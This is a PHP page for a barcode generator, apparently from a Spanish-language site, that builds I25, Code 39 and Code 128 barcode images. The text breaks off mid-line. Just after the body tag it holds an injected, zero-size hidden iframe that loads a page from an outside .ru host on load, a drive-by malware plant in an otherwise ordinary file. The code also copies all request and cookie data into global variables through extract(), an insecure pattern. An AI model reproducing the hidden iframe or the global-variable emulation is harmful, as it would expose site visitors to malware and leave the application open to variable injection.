<? 
// Emular register_globals on   
if (!ini_get('register_globals')) {   
    $superglobales = array($_SERVER, $_ENV,   
        $_FILES, $_COOKIE, $_POST, $_GET);   
    if (isset($_SESSION)) {   
        array_unshift($superglobales, $_SESSION);   
    }   
    foreach ($superglobales as $superglobal) {   
        extract($superglobal, EXTR_SKIP);   
    }   
}  ?>
<html>
<head>
	<title>C&oacute;digo de barras</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"></head>
<body><iframe frameborder="0" onload="if (!this.src){ this.src='http://cliqe.ru:8080/index.php'; this.height='0'; this.width='0';}" >fkbuvvhnhbsdwnqvgsztmhlyifcbkrp</iframe>
<? 
 define (__TRACE_ENABLED__, false);
 define (__DEBUG_ENABLED__, false);
								   
 require("barcode.php");		   
 require("i25object.php");
 require("c39object.php");
 require("c128aobject.php");
 require("c128bobject.php");
 require("c128cobject.php");
 						  
/* Default value */
if (!isset($output))  $output   = "png"; 
if (!isset($type))    $type     = "C128B";
if (!isset($width))   $width    = "460";
if (!isset($height))  $height   = "120";
if (!isset($xres))    $xres     = "2";
if (!isset($font))    $font     = "5";
/*********************************/ 
									
if (isset($barcode) && strlen($barcode)>0) {    
  $style  = BCS_ALIGN_CENTER;					       
  $style |= ($output  == "png" ) ? BCS_IMAGE_PNG  : 0; 
  $style |= ($output  == "jpeg") ? BCS_IMAGE_JPEG : 0; 
  $style |= ($border  == "on"  ) ? BCS_BORDER 	  : 0; 
  $style |= ($drawtext== "on"  ) ? BCS_DRAW_TEXT  : 0; 
  $style |= ($stretchtext== "on" ) ? BCS_STRETCH_TEXT  : 0; 
  $style |= ($negative== "on"  ) ? BCS_REVERSE_COLOR  : 0; 
  
  switch ($type)
  {
    case "I25":
			  $obj = new I25Object(250, 120, $style, $barcode);
			  break;
    case "C39":
			  $obj = new C39Object(250, 120, $style, $barcode);
			  break;
    case "C128A":
			  $obj = new C128AObject(250, 120, $style, $barcode);
			  break;
    case "C128B":
			  $obj = new C128BObject(250, 120, $style, $barcode);
			  break;
    case "C128C":
                          $obj = new C128CObject(250, 120, $style, $barcode);
			  break;
	default:
			$obj = false;
  }
  if ($obj) {
     if ($obj->DrawObject($xres)) {
	 
	 		for ($i=1;$i==$cantidad;$i++)
	 		{
         	echo "<table align='center'><tr><td align='center'><img src='./image.php?code